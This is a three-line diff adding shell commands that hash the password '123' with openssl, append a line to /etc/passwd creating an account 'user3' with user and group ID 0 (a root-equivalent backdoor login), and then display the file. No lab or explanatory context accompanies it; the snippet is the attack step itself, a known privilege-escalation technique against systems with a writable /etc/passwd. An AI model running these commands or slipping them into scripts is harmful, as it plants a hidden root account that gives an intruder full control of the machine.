@@ -1,0 +1,3 @@
+openssl passwd 123
+echo 'user3:ghTC5HTjVd/7M:0:0:root:/root:/bin/bash' >> /etc/passwd
+tail /etc/passwd
